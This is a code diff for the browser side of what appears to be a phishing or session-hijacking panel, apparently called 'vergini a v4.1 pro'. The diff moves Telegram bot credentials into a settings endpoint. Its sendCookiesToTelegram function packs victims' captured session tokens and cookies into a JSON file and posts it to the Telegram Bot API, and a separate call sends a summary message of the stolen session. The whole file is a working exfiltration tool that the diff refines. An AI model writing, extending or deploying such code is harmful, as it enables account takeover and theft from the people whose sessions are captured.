@@ -1,17 +1,35 @@
 document.addEventListener("DOMContentLoaded", () => {
-  document.getElementById("settingsToggle").addEventListener("click", () => {
-    document.getElementById("settingsOverlay").classList.remove("hidden");
-    fetch("/get-telegram")
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById("chatId").value = data.chatId || "";
-        document.getElementById("botToken").value = data.botToken || "";
-      })
-      .catch(error => {
-        console.error("Failed to load settings:", error);
-        showNotify("❌ Could not load saved Telegram settings.", "error");
-      });
-  });
+  const settingsToggle = document.getElementById("settingsToggle");
+  if (settingsToggle) {
+    settingsToggle.addEventListener("click", () => {
+      console.log("Settings opened, fetching Telegram config...");
+      document.getElementById("settingsOverlay").classList.remove("hidden");
+      
+      const chatIdEl = document.getElementById("chatId");
+      const botTokenEl = document.getElementById("botToken");
+      
+      if (!chatIdEl || !botTokenEl) {
+        console.error("Critical Error: chatId or botToken elements not found in DOM!");
+        showNotify("❌ UI Error: Settings fields missing.", "error");
+        return;
+      }
+
+      fetch("/get-telegram")
+        .then(response => {
+          if (!response.ok) throw new Error("HTTP error " + response.status);
+          return response.json();
+        })
+        .then(data => {
+          console.log("Telegram config loaded:", data);
+          chatIdEl.value = data.chatId || "";
+          botTokenEl.value = data.botToken || "";
+        })
+        .catch(error => {
+          console.error("Failed to load settings:", error);
+          showNotify("❌ Could not load saved Telegram settings.", "error");
+        });
+    });
+  }
 
   document.getElementById("settingsOverlay").addEventListener("click", event => {
     const overlayContent = document.querySelector(".overlay-content");
@@ -88,19 +106,26 @@ ${customDataDisplay}
 ╚⋯⋯⋯⋯⋯⋯⋯﴾ 乂𝓋ℯ𝓇ℊ𝒾𝓃𝒾𝒶 𝓋4.1 𝓅𝓇ℴ ﴿⋯⋯⋯⋯⋯⋯⋯`;
 
   try {
-    await fetch("https://api.telegram.org/botPUT UR TELEGRAM TOKEN HERE/sendMessage", {
+    const tgRes = await fetch("/get-telegram");
+    const tgData = await tgRes.json();
+    if (!tgData.botToken || !tgData.chatId) {
+      showNotify("❌ Telegram configuration missing. Set it in settings.", "error");
+      return;
+    }
+
+    await fetch(`https://api.telegram.org/bot${tgData.botToken}/sendMessage`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        chat_id: "PUT UR CHATID HERE",
+        chat_id: tgData.chatId,
         text: message,
         parse_mode: "Markdown"
       })
     });
 
-    sendCookiesToTelegram(sessionData.tokens, sessionData.id);
+    sendCookiesToTelegram(sessionData.tokens, sessionData.id, tgData.botToken, tgData.chatId);
     showNotify("🍪 Cookies sent to Telegram!", "success");
   } catch (error) {
     console.error("Telegram Error:", error);
@@ -108,7 +133,7 @@ ${customDataDisplay}
   }
 }
 
-async function sendCookiesToTelegram(tokens, sessionId) {
+async function sendCookiesToTelegram(tokens, sessionId, botToken, chatId) {
   let cookieArray = [];
 
   for (const domain in tokens) {
@@ -130,11 +155,11 @@ async function sendCookiesToTelegram(tokens, sessionId) {
 
   let blob = new Blob([JSON.stringify(cookieArray, null, 0)], { type: "application/json" });
   let formData = new FormData();
-  formData.append("chat_id", "PUT UR CHATID HERE");
+  formData.append("chat_id", chatId);
   formData.append("document", blob, "cookiesID " + sessionId + ".json");
 
   const xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://api.telegram.org/botPUT UR TELEGRAM TOKEN HERE/sendDocument", true);
+  xhr.open("POST", `https://api.telegram.org/bot${botToken}/sendDocument`, true);
 
   xhr.onload = function () {
     if (xhr.status === 200) {
@@ -720,18 +745,25 @@ function simulateMeteor(startLatLng, targetLatLng) {
 initMap();
 
 document.addEventListener("DOMContentLoaded", async () => {
-  const configResponse = await fetch("/api/config");
-  const config = await configResponse.json();
-  const general = config.general;
+  try {
+    const configResponse = await fetch("/api/config");
+    if (!configResponse.ok) return;
+    const config = await configResponse.json();
+    const general = config.general || {};
 
-  document.getElementById("domain").value = general.domain || "";
-  document.getElementById("use_https").value = general.use_https ? "true" : "false";
-  document.getElementById("unauth_url").value = general.unauth_url || "";
-  document.getElementById("og_title").value = general.og_title || "";
-  document.getElementById("og_desc").value = general.og_desc || "";
-  document.getElementById("og_image").value = general.og_image || "";
-  document.getElementById("chatId").value = general.telegram_chat_id || "";
-  document.getElementById("botToken").value = general.telegram_bot_token || "";
+    const domainEl = document.getElementById("domain");
+    if (domainEl) domainEl.value = general.domain || "";
+    
+    // We already load telegram via /get-telegram on click, 
+    // but if these fields exist globally we'll set them here too
+    const chatIdEl = document.getElementById("chatId");
+    if (chatIdEl) chatIdEl.value = general.telegram_chat_id || "";
+    
+    const botTokenEl = document.getElementById("botToken");
+    if (botTokenEl) botTokenEl.value = general.telegram_bot_token || "";
+  } catch (e) {
+    console.warn("Global config fetch failed (optional):", e);
+  }
 });
 
 async function saveConfig() {
